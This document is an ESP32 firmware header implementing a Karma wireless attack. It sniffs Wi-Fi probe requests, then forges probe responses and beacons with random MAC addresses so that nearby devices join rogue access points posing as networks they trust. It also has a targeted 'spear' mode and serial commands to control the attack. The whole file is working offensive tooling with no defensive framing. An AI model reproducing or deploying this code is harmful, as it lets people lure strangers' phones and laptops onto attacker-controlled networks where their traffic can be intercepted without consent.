// karma.h - Complete Karma Attack Module
#ifndef KARMA_H
#define KARMA_H

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>
#include <map>
#include <set>

// ============= CONSTANTS =============
#define MAX_KARMA_PROBES 200
#define MAX_CUSTOM_PROBES 50

// ============= STRUCTURES =============
struct KarmaProbe {
  String ssid;
  uint32_t firstSeen;
  uint32_t lastSeen;
  int count;
  bool isCustom;
  int channel;
  uint8_t bssid[6];
};

struct KarmaStats {
  int probesDetected = 0;
  int clientsConnected = 0;
  int packetsSent = 0;
};

// ============= GLOBAL VARIABLES =============
bool karmaActive = false;
bool isScanning = false;

std::vector<KarmaProbe> detectedProbes;
std::vector<String> customProbes;
std::set<String> deployedSSIDs;
KarmaStats karmaStats;

// ============= PACKET TEMPLATES =============
uint8_t karmaBeacon[128] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xC0, 0x6C,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x01, 0x04,
  0x00
};

uint8_t probeResponse[128] = {
  0x50, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xC0, 0x6C,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x01, 0x04,
  0x00
};

// ============= FUNCTION PROTOTYPES =============
void karmaSnifferCallback(void* buff, wifi_promiscuous_pkt_type_t type);
void sendProbeResponse(const String& ssid, uint8_t* bssid, int channel);
void sendKarmaBeacon(const String& ssid, uint8_t* bssid, int channel);
void generateRandomMAC(uint8_t* mac);
void processProbeRequest(const String& ssid, wifi_promiscuous_pkt_t* pkt, uint8_t* payload);
void autoRespondToProbe(KarmaProbe* probe);

// ============= INIT =============
void initKarmaModule() {
  Serial.println("Karma module initialized");
}

// ============= CORE FUNCTIONS =============
void startKarmaAttack() {
  if (karmaActive) {
    Serial.println("Karma already running");
    return;
  }
  
  karmaActive = true;
  isScanning = true;
  detectedProbes.clear();
  deployedSSIDs.clear();
  karmaStats = KarmaStats();
  
  Serial.println("Starting Karma Attack...");
  
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300);
  
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&karmaSnifferCallback);
  
  Serial.println("Karma probe sniffing started");
}

void stopKarmaAttack() {
  if (!karmaActive) return;
  
  karmaActive = false;
  isScanning = false;
  
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  
  Serial.println("Karma stopped");
  Serial.printf("Stats - Probes: %d, Packets: %d\n", 
    karmaStats.probesDetected, karmaStats.packetsSent);
}

void startAutoKarma() {
  if (karmaActive) stopKarmaAttack();
  startKarmaAttack();
  Serial.println("Auto Karma mode activated");
}

void startSpearKarma(const String& targetSSID) {
  if (karmaActive) stopKarmaAttack();
  
  karmaActive = true;
  Serial.println("Starting Spear Karma against: " + targetSSID);
  
  uint8_t bssid[6];
  generateRandomMAC(bssid);
  
  // Send beacon for target
  sendKarmaBeacon(targetSSID, bssid, 1);
  sendProbeResponse(targetSSID, bssid, 1);
  
  Serial.println("Spear attack deployed for: " + targetSSID);
}

// ============= PROBE MANAGEMENT =============
void addCustomProbe(const String& ssid) {
  if (ssid.length() == 0 || ssid.length() > 32) return;
  
  for (auto& probe : customProbes) {
    if (probe == ssid) return;
  }
  
  customProbes.push_back(ssid);
  Serial.println("Added custom probe: " + ssid);
}

void removeCustomProbe(const String& ssid) {
  auto it = std::find(customProbes.begin(), customProbes.end(), ssid);
  if (it != customProbes.end()) {
    customProbes.erase(it);
    Serial.println("Removed custom probe: " + ssid);
  }
}

void clearCustomProbes() {
  customProbes.clear();
  Serial.println("Cleared all custom probes");
}

// ============= SNIFFER CALLBACK =============
void karmaSnifferCallback(void* buff, wifi_promiscuous_pkt_type_t type) {
  if (!karmaActive) return;
  if (type != WIFI_PKT_MGMT) return;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buff;
  uint8_t* payload = pkt->payload;
  uint8_t frameType = payload[0] & 0x0C;
  uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
  
  // Probe Request
  if (frameType == 0x04 && frameSubtype == 0x04) {
    int tagStart = 24;
    while (tagStart < pkt->rx_ctrl.sig_len) {
      uint8_t tag = payload[tagStart];
      uint8_t len = payload[tagStart + 1];
      
      if (tag == 0x00 && len > 0 && len <= 32) {
        String ssid;
        for (int i = 0; i < len; i++) {
          ssid += (char)payload[tagStart + 2 + i];
        }
        
        if (ssid.length() > 0) {
          processProbeRequest(ssid, pkt, payload);
        }
        break;
      }
      tagStart += 2 + len;
    }
  }
}

void processProbeRequest(const String& ssid, wifi_promiscuous_pkt_t* pkt, uint8_t* payload) {
  bool found = false;
  for (auto& probe : detectedProbes) {
    if (probe.ssid == ssid) {
      probe.count++;
      probe.lastSeen = millis();
      probe.channel = pkt->rx_ctrl.channel;
      found = true;
      break;
    }
  }
  
  if (!found && detectedProbes.size() < MAX_KARMA_PROBES) {
    KarmaProbe newProbe;
    newProbe.ssid = ssid;
    newProbe.firstSeen = millis();
    newProbe.lastSeen = millis();
    newProbe.count = 1;
    newProbe.isCustom = false;
    newProbe.channel = pkt->rx_ctrl.channel;
    generateRandomMAC(newProbe.bssid);
    detectedProbes.push_back(newProbe);
    
    karmaStats.probesDetected++;
    Serial.printf("[KARMA] New probe: %s (CH:%d, RSSI:%d)\n", 
      ssid.c_str(), pkt->rx_ctrl.channel, pkt->rx_ctrl.rssi);
    
    // Auto respond
    autoRespondToProbe(&newProbe);
  }
}

void autoRespondToProbe(KarmaProbe* probe) {
  if (probe->count > 3) return;
  
  sendProbeResponse(probe->ssid, probe->bssid, probe->channel);
  sendKarmaBeacon(probe->ssid, probe->bssid, probe->channel);
  
  if (deployedSSIDs.find(probe->ssid) == deployedSSIDs.end()) {
    deployedSSIDs.insert(probe->ssid);
    Serial.printf("[KARMA] Deployed AP for: %s\n", probe->ssid.c_str());
  }
}

// ============= PACKET SENDING =============
void sendProbeResponse(const String& ssid, uint8_t* bssid, int channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  memcpy(&probeResponse[10], bssid, 6);
  memcpy(&probeResponse[16], bssid, 6);
  
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(&probeResponse[4], broadcast, 6);
  
  int ssidLen = ssid.length();
  if (ssidLen > 32) ssidLen = 32;
  probeResponse[37] = ssidLen;
  for (int i = 0; i < ssidLen; i++) {
    probeResponse[38 + i] = ssid[i];
  }
  
  esp_wifi_80211_tx(WIFI_IF_AP, probeResponse, sizeof(probeResponse), false);
  karmaStats.packetsSent++;
}

void sendKarmaBeacon(const String& ssid, uint8_t* bssid, int channel) {
  memcpy(&karmaBeacon[10], bssid, 6);
  memcpy(&karmaBeacon[16], bssid, 6);
  
  int ssidLen = ssid.length();
  if (ssidLen > 32) ssidLen = 32;
  karmaBeacon[37] = ssidLen;
  for (int i = 0; i < ssidLen; i++) {
    karmaBeacon[38 + i] = ssid[i];
  }
  
  karmaBeacon[56] = channel;
  
  esp_wifi_80211_tx(WIFI_IF_AP, karmaBeacon, sizeof(karmaBeacon), false);
  karmaStats.packetsSent++;
}

// ============= UTILITY =============
void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  mac[0] = (mac[0] & 0xFE) | 0x02;
}

// ============= STATUS =============
void printKarmaStatus() {
  Serial.println("\n=== KARMA STATUS ===");
  Serial.printf("Active: %s\n", karmaActive ? "YES" : "NO");
  Serial.printf("Probes Detected: %d\n", detectedProbes.size());
  Serial.printf("Custom Probes: %d\n", customProbes.size());
  Serial.printf("Deployed SSIDs: %d\n", deployedSSIDs.size());
  Serial.printf("Packets Sent: %d\n", karmaStats.packetsSent);
  
  if (detectedProbes.size() > 0) {
    Serial.println("\nTop Probes:");
    for (int i = 0; i < min(5, (int)detectedProbes.size()); i++) {
      Serial.printf("  %s (x%d)\n", 
        detectedProbes[i].ssid.c_str(), 
        detectedProbes[i].count);
    }
  }
}

void printKarmaProbes() {
  Serial.println("\n=== KARMA PROBES ===");
  if (detectedProbes.size() == 0) {
    Serial.println("No probes detected");
    return;
  }
  for (size_t i = 0; i < detectedProbes.size(); i++) {
    Serial.printf("[%d] %s (x%d) CH:%d\n",
      i, detectedProbes[i].ssid.c_str(),
      detectedProbes[i].count, detectedProbes[i].channel);
  }
}

// ============= COMMAND HANDLER =============
void handleKarmaCommand(String args) {
  if (args == "on") {
    startKarmaAttack();
  } else if (args == "off") {
    stopKarmaAttack();
  } else if (args == "auto") {
    startAutoKarma();
  } else if (args == "status") {
    printKarmaStatus();
  } else if (args == "list") {
    printKarmaProbes();
  } else if (args.startsWith("spear ")) {
    String target = args.substring(6);
    startSpearKarma(target);
  } else if (args.startsWith("add ")) {
    String probe = args.substring(4);
    addCustomProbe(probe);
  } else if (args.startsWith("remove ")) {
    String probe = args.substring(7);
    removeCustomProbe(probe);
  } else if (args == "clear") {
    clearCustomProbes();
  } else {
    Serial.println("Karma commands:");
    Serial.println("  karma on           - Start Karma Attack");
    Serial.println("  karma off          - Stop Karma Attack");
    Serial.println("  karma auto         - Start Auto Karma Mode");
    Serial.println("  karma spear <SSID> - Spear attack on specific SSID");
    Serial.println("  karma add <SSID>   - Add custom probe");
    Serial.println("  karma remove <SSID>- Remove custom probe");
    Serial.println("  karma clear        - Clear all custom probes");
    Serial.println("  karma status       - Show Karma status");
    Serial.println("  karma list         - List detected probes");
  }
}

// ============= LOOP =============
void runKarmaLoop() {
  if (!karmaActive) return;
  
  static unsigned long lastBeacon = 0;
  static int beaconIndex = 0;
  
  if (millis() - lastBeacon > 2000) {
    lastBeacon = millis();
    
    if (deployedSSIDs.size() > 0) {
      std::vector<String> deployedList(deployedSSIDs.begin(), deployedSSIDs.end());
      
      if (beaconIndex >= (int)deployedList.size()) {
        beaconIndex = 0;
      }
      
      if (beaconIndex < (int)deployedList.size()) {
        String ssid = deployedList[beaconIndex];
        for (auto& probe : detectedProbes) {
          if (probe.ssid == ssid) {
            sendKarmaBeacon(ssid, probe.bssid, probe.channel);
            break;
          }
        }
        beaconIndex++;
      }
    }
  }
  
  delay(10);
}

#endif
